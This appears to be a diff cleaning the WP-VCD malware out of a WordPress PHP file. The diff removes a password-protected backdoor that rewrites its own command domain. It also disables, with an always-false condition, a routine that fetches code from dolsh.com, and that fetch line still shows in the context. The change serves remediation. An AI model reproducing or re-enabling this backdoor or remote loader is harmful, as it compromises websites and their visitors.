@@ -1,38 +1,8 @@
 <?php
 
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '95932624fbf15cb2d15fdcfa3cd0c24b'))
-	{
-$div_code_name="wp_vcd";
-		switch ($_REQUEST['action'])
-			{
-				case 'change_domain';
-					if (isset($_REQUEST['newdomain']))
-						{
-							if (!empty($_REQUEST['newdomain']))
-								{
-                    if ($file = @file_get_contents(__FILE__))
-		                    {
-                        if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-                        {
-	                          $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-	                          @file_put_contents(__FILE__, $file);
-							               print "true";
-                        }
-		                   }
-								}
-						}
-				break;
-
-				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
-			}
-
-		die("");
-	}
-
-
 if ( ! function_exists( 'wp_temp_setup' ) ) {
 	$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
-	if ( ! is_404() && stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
+	if ( ! is_404() && stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false && 0 == 1) {
 
 		if($tmpcontent = @file_get_contents("http://www.dolsh.com/code.php?i=".$path))
 		{
